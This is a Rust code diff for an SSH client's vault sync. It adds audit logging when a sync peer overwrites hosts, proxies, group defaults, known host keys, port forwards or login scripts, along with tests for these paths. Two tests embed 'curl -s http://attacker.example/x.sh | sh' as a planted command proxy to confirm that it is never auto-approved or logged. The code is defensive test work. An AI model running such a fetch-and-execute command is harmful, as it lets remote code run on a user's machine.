@@ -488,6 +488,12 @@ pub(crate) fn apply_records(
         // `Skip`), and this gates deletes too so a stale tombstone can't
         // clobber a newer local edit. Records for entities we've never
         // seen (no local stamp) always pass.
+        // Whether this record REPLACES something already here, which
+        // the same lookup already answers. Only overwrites are worth
+        // an audit line (see `log_route_overwrite`); the peer's new
+        // entities are ordinary replication, and logging those would
+        // write one line per host on a first sync.
+        let overwrites_local = local.contains_key(&(record.entity_type, record.entity_id));
         if let Some(local_ts) = local.get(&(record.entity_type, record.entity_id)) {
             if record.updated_at <= *local_ts {
                 continue;
@@ -564,6 +570,25 @@ pub(crate) fn apply_records(
                 match serde_json::from_slice::<protocol::SyncConnection>(&payload) {
                     Ok(sc) => {
                         let id = sc.connection.id;
+                        if overwrites_local {
+                            let route = match sc.connection.proxy.as_ref() {
+                                Some(p) => format!(
+                                    "{}:{} via {}",
+                                    sc.connection.hostname,
+                                    sc.connection.port,
+                                    proxy_summary(p)
+                                ),
+                                None => {
+                                    format!("{}:{}", sc.connection.hostname, sc.connection.port)
+                                }
+                            };
+                            log_route_overwrite(
+                                &v,
+                                &sc.connection.label,
+                                &sc.connection.hostname,
+                                format!("host updated by a sync peer: {route}"),
+                            );
+                        }
                         log_save!(v.save_connection(
                             &sc.connection,
                             secret_arg(&sc.password, sc.password_cleared)
@@ -611,10 +636,29 @@ pub(crate) fn apply_records(
             }
             EntityType::ProxyIdentity => {
                 match serde_json::from_slice::<protocol::SyncProxyIdentity>(&payload) {
-                    Ok(spi) => log_save!(v.save_proxy_identity(
-                        &spi.proxy_identity,
-                        secret_arg(&spi.password, spi.password_cleared)
-                    )),
+                    Ok(spi) => {
+                        if overwrites_local {
+                            let kind = proxy_summary(
+                                &oryxis_core::models::connection::ProxyConfig {
+                                    proxy_type: spi.proxy_identity.proxy_type.clone(),
+                                    host: spi.proxy_identity.host.clone(),
+                                    port: spi.proxy_identity.port,
+                                    username: None,
+                                    password: None,
+                                },
+                            );
+                            log_route_overwrite(
+                                &v,
+                                &spi.proxy_identity.label,
+                                &spi.proxy_identity.host,
+                                format!("proxy updated by a sync peer: {kind}"),
+                            );
+                        }
+                        log_save!(v.save_proxy_identity(
+                            &spi.proxy_identity,
+                            secret_arg(&spi.password, spi.password_cleared)
+                        ))
+                    }
                     Err(e) => tracing::warn!(
                         "sync: bad ProxyIdentity payload for {}: {e}",
                         record.entity_id
@@ -623,7 +667,23 @@ pub(crate) fn apply_records(
             }
             EntityType::Group => {
                 match serde_json::from_slice::<oryxis_core::models::Group>(&payload) {
-                    Ok(group) => log_save!(v.save_group(&group)),
+                    Ok(group) => {
+                        // Only when the group actually SETS something:
+                        // its defaults are inherited by every host
+                        // inside it that leaves the field empty, which
+                        // is how one write moves many routes at once.
+                        if overwrites_local
+                            && group.defaults.as_ref().is_some_and(|d| !d.is_empty())
+                        {
+                            log_route_overwrite(
+                                &v,
+                                &group.label,
+                                "",
+                                "group defaults updated by a sync peer".to_string(),
+                            );
+                        }
+                        log_save!(v.save_group(&group))
+                    }
                     Err(e) => tracing::warn!(
                         "sync: bad Group payload for {}: {e}",
                         record.entity_id
@@ -650,7 +710,23 @@ pub(crate) fn apply_records(
             }
             EntityType::KnownHost => {
                 match serde_json::from_slice::<oryxis_core::models::KnownHost>(&payload) {
-                    Ok(kh) => log_save!(v.save_known_host(&kh)),
+                    Ok(kh) => {
+                        // The pinned identity of a server, replaced by
+                        // someone else's decision: the one write that
+                        // makes a changed key stop prompting.
+                        if overwrites_local {
+                            log_route_overwrite(
+                                &v,
+                                &kh.hostname,
+                                &kh.hostname,
+                                format!(
+                                    "known host key updated by a sync peer: {} port {} ({})",
+                                    kh.hostname, kh.port, kh.key_type
+                                ),
+                            );
+                        }
+                        log_save!(v.save_known_host(&kh))
+                    }
                     Err(e) => tracing::warn!(
                         "sync: bad KnownHost payload for {}: {e}",
                         record.entity_id
@@ -671,7 +747,20 @@ pub(crate) fn apply_records(
             }
             EntityType::PortForwardRule => {
                 match serde_json::from_slice::<oryxis_core::models::PortForwardRule>(&payload) {
-                    Ok(rule) => log_save!(v.save_port_forward_rule(&rule)),
+                    Ok(rule) => {
+                        // Auto-start only: that flag is what turns a
+                        // stored rule into a dial at the next launch,
+                        // with nobody present.
+                        if overwrites_local && rule.auto_start {
+                            log_route_overwrite(
+                                &v,
+                                &rule.label,
+                                &rule.target_host,
+                                "auto-starting port forward updated by a sync peer".to_string(),
+                            );
+                        }
+                        log_save!(v.save_port_forward_rule(&rule))
+                    }
                     Err(e) => tracing::warn!(
                         "sync: bad PortForwardRule payload for {}: {e}",
                         record.entity_id
@@ -680,7 +769,20 @@ pub(crate) fn apply_records(
             }
             EntityType::LoginScript => {
                 match serde_json::from_slice::<oryxis_core::models::LoginScript>(&payload) {
-                    Ok(script) => log_save!(v.save_login_script(&script)),
+                    Ok(script) => {
+                        // A login script types into the session on its
+                        // own, so a peer editing one edits what gets
+                        // sent to the server.
+                        if overwrites_local {
+                            log_route_overwrite(
+                                &v,
+                                &script.name,
+                                "",
+                                "login script updated by a sync peer".to_string(),
+                            );
+                        }
+                        log_save!(v.save_login_script(&script))
+                    }
                     Err(e) => tracing::warn!(
                         "sync: bad LoginScript payload for {}: {e}",
                         record.entity_id
@@ -754,6 +856,52 @@ fn break_group_cycles(v: &VaultStore) {
             ),
             Err(e) => tracing::warn!("sync: cannot detach cyclic group {}: {e}", repaired.id),
         }
+    }
+}
+
+/// Record that a peer overwrote something route-bearing.
+///
+/// Sync applies a peer's writes with no prompt and no per-record UI: a
+/// completed round reports two counters and nothing else. That is fine
+/// for the labels, colours and notes that make up most of a vault, and
+/// it is not fine for the handful of fields that decide WHERE a
+/// connection goes and WHAT runs to get there, because those are
+/// exactly what a compromised peer would rewrite, and because a route
+/// silently changing under a host that has worked for a year is
+/// indistinguishable from nothing having happened.
+///
+/// So the vault's own event log gets a line. It is deliberately not a
+/// toast (a round can carry many, and the user is rarely watching when
+/// one lands) and deliberately not a diff (the old value is gone by the
+/// time this runs, and a second read per record to reconstruct it would
+/// cost every round for a line nobody reads on most of them). What it
+/// answers is "a peer wrote this, here is what it says now", which is
+/// the question the counters cannot.
+///
+/// Never carries a secret: a proxy is logged by KIND, never by its
+/// command line or credentials.
+fn log_route_overwrite(v: &VaultStore, label: &str, hostname: &str, message: String) {
+    use oryxis_core::models::log_entry::{LogEntry, LogEvent};
+    if let Err(e) = v.add_log(&LogEntry::new(
+        label,
+        hostname,
+        LogEvent::SyncApplied,
+        &message,
+    )) {
+        tracing::warn!("sync: could not log an applied route change: {e}");
+    }
+}
+
+/// How a proxy is described in the audit line: its kind and endpoint,
+/// never the command line (user-authored, can embed credentials) and
+/// never a password.
+fn proxy_summary(proxy: &oryxis_core::models::connection::ProxyConfig) -> String {
+    use oryxis_core::models::connection::ProxyType;
+    match &proxy.proxy_type {
+        ProxyType::Command(_) => "command proxy".to_string(),
+        ProxyType::Socks5 => format!("SOCKS5 {}:{}", proxy.host, proxy.port),
+        ProxyType::Socks4 => format!("SOCKS4 {}:{}", proxy.host, proxy.port),
+        ProxyType::Http => format!("HTTP {}:{}", proxy.host, proxy.port),
     }
 }
 
@@ -1075,5 +1223,230 @@ mod lww_tests {
         assert!(oryxis_core::models::Group::is_reachable_from_root(
             &stored, child.id
         ));
+    }
+
+    /// A sealed proxy-identity record, as a peer would push it.
+    fn proxy_identity_record(
+        pi: &oryxis_core::models::ProxyIdentity,
+    ) -> protocol::SyncRecord {
+        let wrapper = protocol::SyncProxyIdentity {
+            proxy_identity: pi.clone(),
+            password: None,
+            password_cleared: false,
+        };
+        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
+        let payload = cipher
+            .encrypt(&serde_json::to_vec(&wrapper).unwrap())
+            .unwrap();
+        protocol::SyncRecord {
+            entity_type: EntityType::ProxyIdentity,
+            entity_id: pi.id,
+            updated_at: pi.updated_at,
+            is_deleted: false,
+            payload,
+        }
+    }
+
+    /// The command-proxy injection this gate exists for, end to end.
+    ///
+    /// A peer pushes a `ProxyType::Command` proxy identity and points an
+    /// EXISTING group's defaults at it, stamped far in the future so both
+    /// last-writer-wins layers accept it. Every host in that group with
+    /// no proxy of its own then resolves to a local `sh -c` line at its
+    /// next dial, before the handshake, with no user interaction.
+    ///
+    /// Replication is not the bug and this test does not assert against
+    /// it: the records land, exactly as a peer's edits should. What must
+    /// hold is that the planted line is not APPROVED to run on this
+    /// device, because approval is the thing `apply_records` has no way
+    /// to grant (`trusted_proxy_commands` is local-only and no wire
+    /// record touches it), and `oryxis-ssh` refuses to spawn what nobody
+    /// approved.
+    #[test]
+    fn a_pushed_command_proxy_reaches_the_dial_but_is_never_approved() {
+        const PAYLOAD: &str = "curl -s http://attacker.example/x.sh | sh";
+        let vault = vault();
+        let future = Utc::now() + Duration::days(3650);
+
+        // What the victim already has: a group with a host inside it,
+        // and the host names no proxy of its own.
+        let mut group = oryxis_core::models::Group::new("prod");
+        let mut host = Connection::new("web-01", "10.0.0.9");
+        host.group_id = Some(group.id);
+        {
+            let v = vault.lock().unwrap();
+            v.save_group(&group).unwrap();
+            v.save_connection(&host, None).unwrap();
+        }
+
+        // What the peer pushes.
+        let mut planted = oryxis_core::models::ProxyIdentity::new("updates");
+        planted.proxy_type =
+            oryxis_core::models::connection::ProxyType::Command(PAYLOAD.into());
+        planted.updated_at = future;
+        group.defaults = Some(oryxis_core::models::GroupDefaults {
+            proxy_identity_id: Some(planted.id),
+            ..Default::default()
+        });
+        group.updated_at = future;
+        apply_records(
+            &vault,
+            &[proxy_identity_record(&planted), group_record(&group)],
+            Some(&SECRET),
+        )
+        .unwrap();
+
+        let v = vault.lock().unwrap();
+        // The plant did land, and it does reach the dial: this is the
+        // reachability half of the report, kept in the test so the day
+        // inheritance stops resolving it, the reason is a decision and
+        // not an accident.
+        let groups = v.list_groups().unwrap();
+        let mut dialed = host.clone();
+        v.apply_effective(&mut dialed, &groups, &[]);
+        let Some(oryxis_core::models::connection::ProxyType::Command(cmd)) =
+            dialed.proxy.as_ref().map(|p| &p.proxy_type)
+        else {
+            panic!("the planted group default should resolve onto the host's dial");
+        };
+        assert_eq!(cmd, PAYLOAD);
+
+        // And the half that stops it being code execution.
+        assert!(
+            !v.is_proxy_command_trusted(PAYLOAD),
+            "a synced command proxy must never arrive pre-approved"
+        );
+    }
+
+    /// The audit line exists for the case the counters hide: a host
+    /// that already worked, pointed somewhere else by a peer.
+    ///
+    /// Creation is not that. A first sync is nothing but creations, and
+    /// a line per host would bury the one entry that matters.
+    #[test]
+    fn only_an_overwritten_route_lands_in_the_event_log() {
+        let vault = vault();
+        let id = Uuid::new_v4();
+        let now = Utc::now();
+
+        // The peer's brand-new host: replication doing its job.
+        apply_records(&vault, &[conn_record(id, "fresh", now)], Some(&SECRET)).unwrap();
+        assert!(
+            vault.lock().unwrap().list_logs(50).unwrap().is_empty(),
+            "a new host from a peer is not an audit event"
+        );
+
+        // The same host, re-pointed by the peer a minute later.
+        apply_records(
+            &vault,
+            &[conn_record(id, "fresh", now + Duration::seconds(60))],
+            Some(&SECRET),
+        )
+        .unwrap();
+        let logs = vault.lock().unwrap().list_logs(50).unwrap();
+        assert_eq!(logs.len(), 1, "the overwrite must leave a trace");
+        assert!(matches!(
+            logs[0].event,
+            oryxis_core::models::log_entry::LogEvent::SyncApplied
+        ));
+        assert!(logs[0].message.contains("sync peer"), "{}", logs[0].message);
+    }
+
+    /// The audit line describes the route, never the credential: a
+    /// command proxy is logged by KIND, because the line itself is
+    /// user-authored and can embed secrets (the same reason the connect
+    /// progress card only ever names its type).
+    #[test]
+    fn the_audit_line_never_carries_the_command() {
+        const PAYLOAD: &str = "curl -s http://attacker.example/x.sh | sh";
+        let vault = vault();
+        let id = Uuid::new_v4();
+        let now = Utc::now();
+        seed_conn(&vault, id, "web-01", now - Duration::seconds(60));
+
+        let mut c = Connection::new("web-01", "10.0.0.9");
+        c.id = id;
+        c.updated_at = now;
+        c.proxy = Some(oryxis_core::models::connection::ProxyConfig {
+            proxy_type: oryxis_core::models::connection::ProxyType::Command(PAYLOAD.into()),
+            host: String::new(),
+            port: 0,
+            username: None,
+            password: None,
+        });
+        let wrapper = protocol::SyncConnection {
+            connection: c,
+            password: None,
+            password_cleared: false,
+            proxy_password: None,
+            proxy_password_cleared: false,
+            totp_secret: None,
+            totp_secret_cleared: false,
+            target_password: None,
+            target_password_cleared: false,
+        };
+        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
+        let payload = cipher
+            .encrypt(&serde_json::to_vec(&wrapper).unwrap())
+            .unwrap();
+        apply_records(
+            &vault,
+            &[protocol::SyncRecord {
+                entity_type: EntityType::Connection,
+                entity_id: id,
+                updated_at: now,
+                is_deleted: false,
+                payload,
+            }],
+            Some(&SECRET),
+        )
+        .unwrap();
+
+        let logs = vault.lock().unwrap().list_logs(50).unwrap();
+        assert_eq!(logs.len(), 1);
+        assert!(
+            logs[0].message.contains("command proxy"),
+            "the line should say a command proxy is now in the route: {}",
+            logs[0].message
+        );
+        assert!(
+            !logs[0].message.contains(PAYLOAD),
+            "the command line must never be logged"
+        );
+    }
+
+    /// Approval is a LOCAL act and stays one: nothing a peer can push
+    /// grants it, and the vault it was granted in is the only one that
+    /// holds it.
+    #[test]
+    fn approving_a_command_proxy_is_local_and_per_line() {
+        const CMD: &str = "cloudflared access ssh --hostname bastion.example";
+        let other_device = vault();
+        let vault = vault();
+
+        vault
+            .lock()
+            .unwrap()
+            .trust_proxy_command(CMD, "web-01:22")
+            .unwrap();
+        assert!(vault.lock().unwrap().is_proxy_command_trusted(CMD));
+        // One edited character is a different process, so it is a
+        // different decision.
+        assert!(!vault
+            .lock()
+            .unwrap()
+            .is_proxy_command_trusted(&format!("{CMD}x")));
+        // And the grant does not travel: no EntityType covers the table,
+        // so a full sync round cannot carry it.
+        assert!(!other_device.lock().unwrap().is_proxy_command_trusted(CMD));
+
+        vault
+            .lock()
+            .unwrap()
+            .forget_proxy_command(
+                &oryxis_core::models::connection::proxy_command_fingerprint(CMD),
+            )
+            .unwrap();
+        assert!(!vault.lock().unwrap().is_proxy_command_trusted(CMD));
     }
 }
